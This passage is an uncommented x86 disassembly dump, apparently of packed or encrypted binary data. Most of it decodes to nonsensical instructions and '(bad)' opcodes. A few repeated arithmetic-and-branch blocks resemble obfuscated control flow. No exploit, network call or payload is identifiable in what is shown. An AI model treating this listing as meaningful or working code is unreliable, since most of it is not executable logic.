  40594f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405950:	pop    eax
  405951:	jae    0x4059c4
  405953:	mov    al,0xd8
  405955:	xor    DWORD PTR [edi+edi*8+0x58],edi
  405959:	call   0xbb587993
  40595e:	mov    al,ds:0x7474f8d2
  405963:	pop    eax
  405965:	call   0x5c5f3b3e
  40596a:	adc    DWORD PTR [esi],ebp
  40596c:	mov    ecx,edi
  40596e:	ins    BYTE PTR es:[edi],dx
  40596f:	hlt    
  405970:	jmp    0x159af690
  405975:	mov    esi,0xe9d0558b
  40597a:	pop    esi
  40597b:	or     al,BYTE PTR [eax]
  40597d:	add    BYTE PTR [ebx+0x7d8bc855],cl
  405983:	cld    
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	or     esp,DWORD PTR [edi+0x54]
  4059b3:	stos   BYTE PTR es:[edi],al
  4059b4:	push   0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x4059df
  4059bd:	xor    ebx,DWORD PTR [eax]
  4059bf:	cmp    bh,BYTE PTR [eax+esi*1]
  4059c2:	xchg   ecx,eax
  4059c3:	addr16 hlt 
  4059c5:	add    al,0x7a
  4059c7:	cwde   
  4059c8:	jns    0x405a35
  4059ca:	push   ecx
  4059cb:	iret   
  4059cc:	ret    
  4059cd:	lods   eax,DWORD PTR ds:[esi]
  4059ce:	cmp    DWORD PTR [ecx-0x5c5a1d5f],ebx
  4059d4:	dec    ebp
  4059d5:	ins    BYTE PTR es:[edi],dx
  4059d6:	call   0x3121:0x2829c9e9
  4059dd:	inc    ebx
  4059de:	pusha  
  4059df:	inc    esi
  4059e0:	mov    eax,0x76fcbea6
  4059e5:	loopne 0x405970
  4059e7:	aas    
  4059e8:	mov    al,0x80
  4059ea:	sbb    esp,esi
  4059ec:	fld    TBYTE PTR [ecx+edx*8+0x3543c13d]
  4059f3:	jle    0x405a5d
  4059f5:	loop   0x405a20
  4059f7:	mov    ds:0x7d4e4710,eax
  4059fc:	popa   
  4059fd:	out    0x72,eax
  4059ff:	push   ebx
  405a00:	iret   
  405a01:	aaa    
  405a02:	in     eax,0xd6
  405a04:	in     al,0x97
  405a06:	test   BYTE PTR [edi+0x3a73f480],al
  405a0c:	sub    BYTE PTR [edi-0x11],0x80
  405a10:	jl     0x405a15
  405a12:	jmp    0x487e:0xac0fc74f
  405a19:	xchg   esp,eax
  405a1a:	bound  ebp,QWORD PTR [edx-0x253770ff]
  405a20:	mov    BYTE PTR [ecx+0x53],dl
  405a23:	xlat   BYTE PTR ds:[ebx]
  405a24:	cdq    
  405a25:	push   0x1e1ba4f6
  405a2a:	push   ss
  405a2b:	jl     0x405a57
  405a2d:	in     eax,dx
  405a2e:	xchg   ecx,eax
  405a2f:	mov    ebx,0x9ff9c58c
  405a34:	sbb    dh,bh
  405a36:	stc    
  405a37:	retf   
  405a38:	sar    DWORD PTR [eax-0x3e],0x50
  405a3c:	xchg   DWORD PTR [edx],edi
  405a3e:	push   edi
  405a3f:	add    DWORD PTR [esi-0x23],ebp
  405a42:	fs aad 0x12
  405a45:	cdq    
  405a46:	sbb    al,0x6f
  405a48:	fcom   DWORD PTR [edx+0x6f2190e2]
  405a4e:	xchg   esp,eax
  405a4f:	lods   al,BYTE PTR ds:[esi]
  405a50:	sub    bh,al
  405a52:	add    al,0x4b
  405a54:	jmp    DWORD PTR [ebp+0x21bc65b0]
  405a5a:	dec    esi
  405a5b:	test   ebx,0xa6392ce1
  405a61:	jne    0x4059ec
  405a63:	push   ebx
  405a64:	xlat   BYTE PTR ds:[ebx]
  405a65:	xor    eax,0x7aa820dd
  405a6a:	mov    al,ds:0x833b643
  405a6f:	sub    esp,DWORD PTR [ebp+0x1a]
  405a72:	and    eax,0x66a97e82
  405a77:	rcl    esp,cl
  405a79:	jl     0x405a24
  405a7b:	adc    eax,0x876992b2
  405a80:	mov    ds:0x215d68a,eax
  405a85:	fsub   DWORD PTR [edx+0x72f025af]
  405a8b:	inc    ebp
  405a8c:	ss inc ecx
  405a8e:	sahf   
  405a8f:	cmp    bl,BYTE PTR [esi+esi*8]
  405a92:	(bad)  
  405a94:	lock sub eax,0xe05adf6b
  405a9a:	dec    esi
  405a9b:	push   esi
  405a9c:	inc    ebx
  405a9d:	cmp    edx,DWORD PTR [edx+0x65e500b7]
  405aa3:	repz jg 0x405ad5
  405aa6:	iret   
  405aa7:	std    
  405aa8:	sub    cl,bl
  405aaa:	inc    ebp
  405aab:	aaa    
  405aac:	test   DWORD PTR [esi-0x72],ebx
  405aaf:	out    dx,al
  405ab0:	repnz xchg esp,eax
  405ab2:	out    dx,al
  405ab3:	sub    edx,DWORD PTR [esi+0x12]
  405ab6:	mov    gs,WORD PTR [edi-0x2a3a4af7]
  405abc:	call   0x8fc5:0xd62a04fa
  405ac3:	es dec eax
  405ac5:	jl     0x405a7f
  405ac7:	fdiv   QWORD PTR [ecx]
  405ac9:	and    bl,BYTE PTR ds:0x34e6977d
  405acf:	xchg   edx,eax
  405ad0:	pop    ss
  405ad1:	div    DWORD PTR [ebx+ebx*4]
  405ad4:	or     bh,dh
  405ad6:	mov    ds:0xea06508b,eax
  405adb:	dec    ebx
  405adc:	aam    0x24
  405ade:	xchg   ebx,eax
  405adf:	pop    edx
  405ae0:	inc    edi
  405ae1:	pop    ecx
  405ae2:	mov    BYTE PTR [ebx-0x2a620b8d],cl
  405ae8:	aam    0x94
  405aea:	xor    BYTE PTR [edi-0x5394c11f],ch
  405af0:	stos   DWORD PTR es:[edi],eax
  405af1:	push   ebx
  405af2:	fst    QWORD PTR [edi+0xb]
  405af5:	out    dx,al
  405af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405af7:	mov    edx,0x37c8a35a
  405afc:	scas   al,BYTE PTR es:[edi]
  405afd:	fcomip st,st(1)
  405aff:	retf   0x56cd
  405b02:	fcomp  QWORD PTR [eax]
  405b04:	push   edx
  405b05:	les    ecx,FWORD PTR [ebx-0x6e]
  405b08:	test   esp,edi
  405b0a:	cmc    
  405b0b:	mov    ds:0x406ccb4b,al
  405b10:	push   cs
  405b11:	cmp    al,0x6
  405b13:	xor    eax,0x2fa4e463
  405b18:	push   edi
  405b19:	popa   
  405b1a:	in     eax,dx
  405b1b:	push   ebp
  405b1c:	leave  
  405b1d:	out    dx,eax
  405b1e:	sub    BYTE PTR ds:0x8cf3aa0d,bl
  405b24:	push   0x7d5a3798
  405b29:	cmp    bh,dl
  405b2b:	xor    eax,0xc3031d2e
  405b30:	add    BYTE PTR [edx],cl
  405b32:	in     eax,0xc7
  405b34:	pop    ds
  405b35:	out    dx,al
  405b36:	mov    esi,0xe9c79624
  405b3b:	les    ebx,FWORD PTR [esi+0x21e63cf]
  405b41:	mov    eax,0x82746bb6
  405b46:	mov    BYTE PTR [eax+0x40262635],0x94
  405b4d:	aas    
  405b4e:	xchg   ebp,eax
  405b4f:	int    0x30
  405b51:	mov    eax,ds:0xe54e4c18
  405b56:	sub    BYTE PTR [eax*8+0x385294ab],bl
  405b5d:	jmp    0xe2c0:0x2398b518
  405b64:	mov    ds:0xd9775bac,al
  405b69:	adc    BYTE PTR ds:0x773c6294,bl
  405b6f:	sbb    BYTE PTR [ebx+eax*1-0x14],0x33
  405b74:	enter  0xbf9b,0x5a
  405b78:	mov    DWORD PTR [ecx],edx
  405b7a:	leave  
  405b7b:	out    0xb6,eax
  405b7d:	mov    ss,WORD PTR [edi-0x58]
  405b80:	pop    eax
  405b81:	add    esp,ebp
  405b83:	dec    esi
  405b84:	out    dx,al
  405b85:	inc    ebp
  405b86:	cmc    
  405b87:	sub    al,0xe
  405b89:	lock out 0x0,eax
  405b8c:	dec    edx
  405b8d:	dec    eax
  405b8e:	jnp    0x405b89
  405b90:	and    cl,BYTE PTR [esi]
  405b92:	pop    edi
  405b93:	inc    ebp
  405b94:	sti    
  405b95:	xor    eax,0xec835d26
  405b9a:	out    dx,eax
  405b9b:	push   edx
  405b9c:	mov    edi,0x80c5fcf9
  405ba1:	scas   al,BYTE PTR es:[edi]
  405ba2:	jle    0x405bf9
  405ba4:	dec    edx
  405ba5:	mov    ds:0x4078d2be,al
  405baa:	and    eax,0x4e1c05ff
  405baf:	sub    BYTE PTR [esi+0xf],dl
  405bb2:	js     0x405b6b
  405bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb5:	mov    BYTE PTR [ebp+0x5],ah
  405bb8:	test   ch,bl
  405bba:	xchg   BYTE PTR [ecx+0x1c],cl
  405bbd:	je     0x405b5d
  405bbf:	das    
  405bc0:	inc    esi
  405bc1:	mov    al,ds:0x929beeb4
  405bc6:	enter  0x8315,0x4d
  405bca:	adc    eax,0x20b07a83
  405bcf:	js     0x405beb
  405bd1:	out    0x68,eax
  405bd3:	add    al,0xf0
  405bd5:	push   es
  405bd6:	mov    bh,cl
  405bd8:	clc    
  405bd9:	sbb    BYTE PTR [ecx+ebp*2],ch
  405bdc:	pop    ss
  405bdd:	push   cs
  405bde:	or     al,0x1f
  405be0:	pop    eax
  405be1:	mov    ebx,0x617100ad
  405be6:	data16 cli 
  405be8:	cld    
  405be9:	inc    edx
  405bea:	out    dx,al
  405beb:	inc    ecx
  405bec:	cld    
  405bed:	aam    0x9d
  405bef:	adc    ebp,DWORD PTR [ecx+0x79]
  405bf2:	jmp    0x405c4a
  405bf4:	call   0xbd1f5282
  405bf9:	inc    eax
  405bfa:	stos   DWORD PTR es:[edi],eax
  405bfb:	in     eax,0x87
  405bfd:	aam    0x95
  405bff:	inc    eax
  405c00:	and    BYTE PTR [edi],0x40
  405c03:	jp     0x405c53
  405c05:	pop    eax
  405c06:	jns    0x405b88
  405c08:	lods   eax,DWORD PTR ds:[esi]
  405c09:	xchg   BYTE PTR [esi-0x3f],ah
  405c0c:	sar    edx,1
  405c0e:	mov    ecx,0x146643b0
  405c13:	rcl    BYTE PTR [edx+0x61],1
  405c16:	dec    esp
  405c17:	push   0x9f1af4f9
  405c1c:	inc    eax
  405c1d:	adc    al,0x52
  405c1f:	adc    al,0xb3
  405c21:	add    esi,DWORD PTR [ebp+0x1903e463]
  405c27:	call   0xe9f2e3ca
  405c2c:	cmc    
  405c2d:	xchg   ebp,eax
  405c2e:	(bad)  
  405c30:	xchg   DWORD PTR [ecx+ebx*2+0x6466b7d7],esp
  405c37:	rol    BYTE PTR [edi],cl
  405c39:	add    edi,DWORD PTR [esi-0x70]
  405c3c:	bound  ebp,QWORD PTR [edi+0x2292e5e7]
  405c42:	ss push esp
  405c44:	hlt    
  405c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c46:	iret   
  405c47:	mov    ds:0xc021c1df,eax
  405c4c:	sar    dh,1
  405c4e:	aad    0xc9
  405c50:	cmp    eax,0xacd2d5d6
  405c55:	inc    ebx
  405c56:	push   ss
  405c57:	pop    edx
  405c58:	xchg   edx,eax
  405c59:	or     DWORD PTR [esp+esi*4-0x673cdbe9],edx
  405c60:	inc    esi
  405c61:	add    DWORD PTR [esi+0x55],ebx
  405c64:	xor    BYTE PTR [ebp+0x7f],cl
  405c67:	or     edx,DWORD PTR [eax]
  405c69:	add    al,0x17
  405c6b:	stos   DWORD PTR es:[edi],eax
  405c6c:	nop
  405c6d:	adc    DWORD PTR [eax+0x5a],ecx
  405c70:	cdq    
  405c71:	mov    ds:0x9bf97a18,eax
  405c76:	push   eax
  405c77:	shr    BYTE PTR [eax+0x4d],1
  405c7a:	loop   0x405cd0
  405c7c:	add    BYTE PTR [esi],dl
  405c7e:	pushf  
  405c7f:	pop    ds
  405c80:	mov    DWORD PTR [edx],eax
  405c82:	int    0xbe
  405c84:	rcl    BYTE PTR [edi],cl
  405c86:	push   esi
  405c87:	std    
  405c88:	jne    0x405c55
  405c8a:	ins    BYTE PTR es:[edi],dx
  405c8b:	mov    dh,0x3
  405c8d:	mov    esi,0xa55a73c7
  405c92:	hlt    
  405c93:	push   eax
  405c94:	add    ebp,DWORD PTR [ebx]
  405c96:	jl     0x405c41
  405c98:	hlt    
  405c99:	xchg   edx,eax
  405c9a:	repz mov dl,0x66
  405c9d:	and    eax,esp
  405c9f:	icebp  
  405ca0:	dec    ebp
  405ca1:	sti    
  405ca2:	shl    DWORD PTR [eax-0x6294e568],1
  405ca8:	lods   al,BYTE PTR ds:[esi]
  405ca9:	outs   dx,BYTE PTR ds:[esi]
  405caa:	cmp    DWORD PTR [ebp+0x57bc0267],eax
  405cb0:	pop    esi
  405cb1:	jmp    0x405cb2
  405cb3:	es mov ch,0x57
  405cb6:	pop    ds
  405cb7:	or     al,0x70
  405cb9:	pop    ecx
  405cba:	jns    0x405c65
  405cbc:	sbb    bl,BYTE PTR [ecx+edx*2-0x10ab283a]
  405cc3:	test   BYTE PTR [ebp+0x3ae1501c],0x19
  405cca:	push   es
  405ccb:	(bad)  ds:0x7e1ca186
  405cd1:	push   ecx
  405cd2:	and    ecx,DWORD PTR [edx+0x7278766e]
  405cd8:	das    
  405cd9:	aad    0x7
  405cdb:	mov    ah,0x65
  405cdd:	inc    ebx
  405cde:	mov    DWORD PTR [ebx+0x38],esi
  405ce1:	lds    ebx,FWORD PTR [ecx-0x7f]
  405ce4:	sbb    eax,ebx
  405ce6:	loopne 0x405d55
  405ce8:	pop    edx
  405ce9:	int3   
  405cea:	loope  0x405ce2
  405cec:	add    al,0x4
  405cee:	imul   ebx,DWORD PTR [ebx],0xffffffdf
  405cf1:	stos   DWORD PTR es:[edi],eax
  405cf2:	sub    al,BYTE PTR [edi+ebx*4+0x57f2bcbc]
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	xchg   esi,eax
  405d2c:	jne    0x405d22
  405d2e:	push   es
  405d2f:	das    
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d0f
  405d38:	test   eax,0x4143a24f
  405d3d:	inc    esp
  405d3e:	je     0x405d13
  405d40:	loopne 0x405d1c
  405d42:	in     al,0x3d
  405d44:	mov    edi,0x33583e33
  405d49:	add    dh,BYTE PTR [esi+edx*2-0x1bd6c5c8]
  405d50:	push   0x235a67f3
  405d55:	in     al,dx
  405d56:	mov    dh,0xda
  405d58:	pop    ds
  405d59:	das    
  405d5a:	retf   
  405d5b:	push   0xbb55f291
  405d60:	sar    ah,cl
  405d62:	inc    edi
  405d63:	jmp    0x405ddd
  405d65:	xor    eax,0x6d0b0c4f
  405d6a:	fs dec esi
  405d6c:	add    edx,DWORD PTR [ecx]
  405d6e:	mov    bh,BYTE PTR [edx-0x41]
  405d71:	outs   dx,DWORD PTR fs:[esi]
  405d73:	xchg   esp,eax
  405d74:	test   eax,0x79dce521
  405d79:	ret    0xa9fb
  405d7c:	pushf  
  405d7d:	push   esi
  405d7e:	(bad)  
  405d80:	push   0x28
  405d82:	mov    bl,BYTE PTR [ecx+0x6acaf680]
  405d88:	push   0xf9724e86
  405d8d:	fcomip st,st(3)
  405d8f:	or     ecx,DWORD PTR [ecx-0x36]
  405d92:	mov    ah,0x97
  405d94:	adc    DWORD PTR ds:[ebp+eiz*8-0x4d],esp
  405d99:	pushf  
  405d9a:	rcr    BYTE PTR [edi+0x70],0xbf
  405d9e:	sar    DWORD PTR [edx+0x8b468bc],cl
  405da4:	push   esp
  405da5:	or     eax,0xf074ccec
  405daa:	xor    BYTE PTR [esi-0x15f104e5],0x8d
  405db1:	push   ecx
  405db2:	jg     0x405ddc
  405db4:	mov    WORD PTR [esi],ss
  405db6:	nop
  405db7:	push   ss
  405db8:	dec    ebp
  405db9:	div    DWORD PTR [edi+0x41]
  405dbc:	cmp    BYTE PTR [ebp-0x6d],bh
  405dbf:	add    al,0xbc
  405dc1:	or     ecx,DWORD PTR [ebp-0x43881eee]
  405dc7:	call   0x92d:0x7dceddd9
  405dce:	sub    DWORD PTR [ecx+eax*2-0x54a56dfe],ebp
  405dd5:	sbb    al,0x32
  405dd7:	mov    esi,0x9ad3aba2
  405ddc:	mov    ah,0x3
  405dde:	cmp    BYTE PTR [edi-0x105df017],al
  405de4:	arpl   si,bp
  405de6:	shl    esi,cl
  405de8:	jae    0x405e0d
  405dea:	(bad)  
  405deb:	xchg   esi,eax
  405dec:	sbb    cl,BYTE PTR [edx]
  405dee:	ja     0x405d92
  405df0:	xchg   esp,eax
  405df1:	dec    esp
  405df2:	stos   BYTE PTR es:[edi],al
  405df3:	aad    0x23
  405df5:	xor    ebx,DWORD PTR [ebp-0x7ca54f76]
  405dfb:	add    esi,eax
  405dfd:	or     eax,0x39109d02
  405e02:	ins    DWORD PTR es:[edi],dx
  405e03:	(bad)  
  405e05:	repz and ebx,DWORD PTR [esi+0x4f106165]
  405e0c:	outs   dx,DWORD PTR ds:[esi]
  405e0d:	push   0xffffffdd
  405e0f:	call   0xd6ba473f
  405e14:	outs   dx,DWORD PTR ds:[esi]
  405e15:	stos   BYTE PTR es:[edi],al
  405e16:	and    edi,eax
  405e18:	sbb    dl,BYTE PTR [ecx+0x16]
  405e1b:	lods   al,BYTE PTR ds:[esi]
  405e1c:	add    esp,DWORD PTR [ecx-0x2e]
  405e1f:	mov    edx,0x4d1edcba
  405e24:	add    al,0x7c
  405e26:	dec    esi
  405e27:	adc    cl,al
  405e29:	adc    al,0x93
  405e2b:	clc    
  405e2c:	mov    ecx,0xe9cb389f
  405e31:	and    DWORD PTR [edx+0x65],esi
  405e34:	add    dl,BYTE PTR [edi]
  405e36:	loope  0x405e61
  405e38:	popa   
  405e39:	int    0x66
  405e3b:	(bad)  
  405e3f:	in     al,dx
  405e40:	and    BYTE PTR [edx+0x64],al
  405e43:	pop    ebx
  405e45:	add    al,0x3b
  405e47:	aam    0xaa
  405e49:	pop    es
  405e4a:	mov    ebx,0xd4a4f2e5
  405e4f:	test   al,0x47
  405e51:	pop    ebp
  405e52:	(bad)  
  405e53:	jmp    0x405e8e
  405e55:	adc    al,0x6
  405e57:	pop    esi
  405e58:	adc    dl,ch
  405e5a:	pop    ebx
  405e5b:	ficom  WORD PTR [esi+0x5f]
  405e5e:	mov    al,0x23
  405e60:	sahf   
  405e61:	ds movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  405e64:	ins    DWORD PTR es:[edi],dx
  405e65:	repnz or al,0xb9
  405e68:	jmp    0x52ca:0xb8fd5ac6
  405e6f:	inc    DWORD PTR [edx+0x3bac6456]
  405e75:	mov    ebp,edi
  405e77:	mov    edx,0x57f73eb9
  405e7c:	pop    edi
  405e7d:	jg     0x405eb8
  405e7f:	dec    esi
  405e80:	xchg   edx,eax
  405e81:	pop    ds
  405e82:	jg     0x405eb3
  405e84:	inc    ecx
  405e85:	mov    BYTE PTR [edi-0x55],bl
  405e88:	int    0xb7
  405e8a:	sub    al,0xc3
  405e8c:	sbb    eax,0x620a0c9d
  405e91:	outs   dx,BYTE PTR ds:[esi]
  405e92:	gs jle 0x405e6f
  405e95:	pop    ecx
  405e96:	inc    ebp
  405e97:	or     esp,DWORD PTR [edi-0x4c4ebcbb]
  405e9d:	aad    0x2a
  405e9f:	sub    edx,edi
  405ea1:	pop    esp
  405ea2:	nop
  405ea3:	or     DWORD PTR [ecx+0x16b07fa3],0x60ed8381
  405ead:	scas   al,BYTE PTR es:[edi]
  405eae:	pop    edi
  405eaf:	in     eax,dx
  405eb0:	mov    cl,0x92
  405eb2:	popa   
  405eb3:	cld    
  405eb4:	rcl    ebx,cl
  405eb6:	mov    edx,0x675ff129
  405ebb:	daa    
  405ebc:	or     bl,0x15
  405ebf:	mov    ds:0x12ed4a6a,al
  405ec4:	sub    BYTE PTR [edx],cl
  405ec6:	cwde   
  405ec7:	das    
  405ec8:	sti    
  405ec9:	push   edx
  405eca:	aas    
  405ecb:	inc    DWORD PTR [edx+0x54586de0]
  405ed1:	in     al,0xfa
  405ed3:	xlat   BYTE PTR ds:[ebx]
  405ed4:	mov    eax,ds:0x6633740b
  405ed9:	xchg   ecx,eax
  405eda:	jno    0x405e9c
  405edc:	pop    ebp
  405edd:	pop    ds
  405ede:	call   0x44e2a2e8
  405ee3:	test   al,0x1
  405ee5:	(bad)  
  405ee6:	test   BYTE PTR [eax+0x7e],0xd
  405eea:	adc    DWORD PTR [edx],ebx
  405eec:	aad    0xb9
  405eee:	fild   WORD PTR [edi]
  405ef0:	pop    edx
  405ef1:	fwait
  405ef2:	nop
  405ef3:	imul   ebx,DWORD PTR ds:0x487aba88,0x5afd53d5
  405efd:	xchg   esi,ecx
  405eff:	add    al,0x4
  405f01:	and    eax,0x928253ef
  405f06:	ds dec edx
  405f08:	outs   dx,BYTE PTR ds:[esi]
  405f09:	cmp    ecx,DWORD PTR [edi]
  405f0b:	rcl    WORD PTR [edi-0x3f],0x4c
  405f10:	inc    edi
  405f11:	xchg   ecx,eax
  405f12:	inc    esi
  405f13:	mov    bh,0x50
  405f15:	pop    ds
  405f16:	shl    ebp,0x10
  405f19:	loopne 0x405f34
  405f1b:	loop   0x405f26
  405f1d:	stos   DWORD PTR es:[edi],eax
  405f1e:	push   es
  405f1f:	dec    ebp
  405f20:	loopne 0x405eb2
  405f22:	imul   edi,DWORD PTR [esi+0x5e8a161],0xffffffca
  405f29:	stos   DWORD PTR es:[edi],eax
  405f2a:	aas    
  405f2b:	hlt    
  405f2c:	das    
  405f2d:	fild   WORD PTR [ebx-0x28]
  405f30:	hlt    
  405f31:	mov    al,ds:0x79c3326e
  405f36:	(bad)  
  405f37:	fadd   QWORD PTR [ebx+ebx*8]
  405f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f3b:	mov    cl,0x58
  405f3d:	ins    BYTE PTR es:[edi],dx
  405f3e:	dec    esp
  405f3f:	push   esi
  405f40:	dec    ebp
  405f41:	inc    ecx
  405f42:	pop    esp
  405f43:	and    eax,0x55386a74
  405f48:	mov    dl,dl
  405f4a:	out    dx,al
  405f4b:	jl     0x405f6a
  405f4d:	stc    
  405f4e:	cmc    
  405f4f:	xchg   edi,eax
  405f50:	shr    DWORD PTR [ecx+eax*8+0x4af8b39c],1
  405f57:	fst    QWORD PTR [ecx+0x19]
  405f5a:	daa    
  405f5b:	adc    ch,ch
  405f5d:	stc    
  405f5e:	xor    cl,dl
  405f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f61:	dec    edi
  405f62:	aas    
  405f63:	mov    bh,0xc7
  405f65:	mov    ecx,0x77604117
  405f6a:	lods   eax,DWORD PTR ds:[esi]
  405f6b:	mov    ch,0x35
  405f6d:	adc    eax,0xd5746ffa
  405f72:	adc    al,0x83
  405f74:	sti    
  405f75:	add    ch,BYTE PTR [edx-0x5e]
  405f78:	jns    0x405f3f
  405f7a:	add    DWORD PTR [ebx+0x4138c3b3],ebp
  405f80:	or     ebp,esi
  405f82:	dec    edx
  405f83:	and    bh,BYTE PTR [esi+ebx*1-0x60]
  405f87:	ins    DWORD PTR es:[edi],dx
  405f88:	rol    DWORD PTR [edx],cl
  405f8a:	sub    eax,DWORD PTR [esi]
  405f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f8d:	rcl    BYTE PTR [esi+edx*4-0x48],0xf2
  405f92:	clc    
  405f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f94:	jbe    0x405fe7
  405f96:	bound  esp,QWORD PTR [eax-0x4]
  405f99:	std    
  405f9a:	sub    eax,0x9a506bf5
  405f9f:	aas    
  405fa0:	or     DWORD PTR [ebx+0x6b],eax
  405fa3:	lahf   
  405fa4:	fdiv   st(7),st
  405fa6:	cmp    eax,0x99fc146
  405fab:	and    BYTE PTR [edi+eax*8-0x1f0f5e8e],dh
  405fb2:	cli    
  405fb3:	out    0xd1,al
  405fb5:	cld    
  405fb6:	push   ebx
  405fb7:	push   0xffffff97
  405fb9:	mov    ebx,0x71a2bae4
  405fbe:	mov    DWORD PTR ds:0xf504b329,ebp
  405fc4:	add    DWORD PTR [esi-0x51b27e0a],edx
  405fca:	cdq    
  405fcb:	(bad)  
  405fce:	clc    
  405fcf:	and    DWORD PTR [ecx],edx
  405fd1:	adc    DWORD PTR [ecx-0x43],esp
  405fd4:	sbb    BYTE PTR [eax],ah
  405fd6:	int3   
  405fd7:	push   esp
  405fd8:	gs sub al,0xa3
  405fdb:	ror    al,cl
  405fdd:	je     0x406048
  405fdf:	and    eax,0x204d3219
  405fe4:	ret    0x1169
  405fe7:	or     BYTE PTR [eax-0x6d4d5130],al
  405fed:	mov    eax,ds:0xdc6bec51
  405ff2:	dec    eax
  405ff3:	(bad)  
  405ff4:	jl     0x406006
  405ff6:	sbb    DWORD PTR [esi+edi*4-0x362f9f81],0x6169b8d4
  406001:	dec    ecx
  406002:	retf   0x3d38
  406005:	imul   esp,DWORD PTR [ebp-0x5ae0e91],0x9
  40600c:	(bad)  
  40600d:	pop    eax
  40600e:	add    al,0x21
  406010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406011:	inc    esi
  406012:	adc    eax,DWORD PTR [esi-0x13]
  406015:	pop    DWORD PTR [edx+0x342b8746]
  40601b:	dec    eax
  40601c:	add    bl,0xc9
  40601f:	test   eax,0xf5d9504d
  406024:	xchg   esp,esp
  406026:	(bad)  
  406027:	fdivr  QWORD PTR [ecx]
  406029:	ins    BYTE PTR es:[edi],dx
  40602a:	sbb    esp,DWORD PTR [esi-0x6b]
  40602d:	int    0x19
  40602f:	add    dh,BYTE PTR [ebx-0x57]
  406032:	cmp    edx,ebx
  406034:	sub    al,0x8b
  406036:	xchg   edi,eax
  406037:	cwde   
  406038:	scas   eax,DWORD PTR es:[edi]
  406039:	popa   
  40603a:	stos   BYTE PTR es:[edi],al
  40603b:	push   ebp
  40603c:	sub    esp,esi
  40603e:	xor    dh,ah
  406040:	and    edx,DWORD PTR [edi]
  406042:	scas   al,BYTE PTR es:[edi]
  406043:	or     al,0x73
  406045:	jle    0x40604d
  406047:	jmp    0x406007
  406049:	push   ds
  40604a:	pop    esi
  40604b:	sbb    BYTE PTR [ecx+0x57cfcad8],dl
  406051:	adc    al,0x4d
  406053:	sub    DWORD PTR fs:[edi],esp
  406056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406057:	test   eax,ebp
  406059:	aas    
  40605a:	jmp    FWORD PTR [esi-0x720e7040]
  406060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406061:	xchg   ebx,eax
  406062:	js     0x406065
  406064:	adc    al,0x70
  406066:	add    eax,DWORD PTR [ebx]
  406068:	in     eax,0x82
  40606a:	inc    ebp
  40606b:	jo     0x405ff3
  40606d:	or     al,0x40
  40606f:	sub    cl,cl
  406071:	and    DWORD PTR [esi+esi*8+0x3b],esp
  406075:	fimul  DWORD PTR [ebx+0x55e9c855]
  40607b:	add    eax,DWORD PTR [eax]
  40607d:	add    BYTE PTR [ecx+0x68f06eef],ch
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0x3e
  40608b:	out    0x2c,al
  40608d:	shl    eax,0x3d
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x406056
  406097:	mov    ah,0x2a
  406099:	inc    edx
  40609a:	call   0x6bf7e8af
  40609f:	mov    BYTE PTR [edx-0x692dec2f],cl
  4060a5:	add    eax,0x6508afdf
  4060aa:	int    0xad
  4060ac:	pushf  
  4060ad:	pushf  
  4060ae:	sbb    al,0x2a
  4060b0:	xor    BYTE PTR [edi],ch
  4060b2:	outs   dx,DWORD PTR ds:[esi]
  4060b3:	mov    cl,0x36
  4060b5:	lahf   
  4060b6:	sub    DWORD PTR [eax-0x59535f90],edi
  4060bc:	sbb    al,0xc3
  4060be:	jb     0x4060eb
  4060c0:	xchg   esp,eax
  4060c1:	sbb    al,0x6a
  4060c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060c4:	cmp    eax,0xc0a6f97c
  4060c9:	jecxz  0x406067
  4060cb:	push   edx
  4060cc:	(bad)  
  4060cd:	int3   
  4060ce:	xchg   ebx,eax
  4060cf:	pop    eax
  4060d0:	sbb    eax,0xa784c5c1
  4060d5:	cli    
  4060d6:	mov    esi,0x7fe1b2fa
  4060db:	sar    dl,1
  4060dd:	xchg   ecx,eax
  4060de:	popa   
  4060df:	fld    DWORD PTR [edi-0x70950d9]
  4060e5:	and    DWORD PTR [ecx+0x6b],edi
  4060e8:	and    DWORD PTR [edi+0x3a836167],0xf
  4060ef:	pop    edx
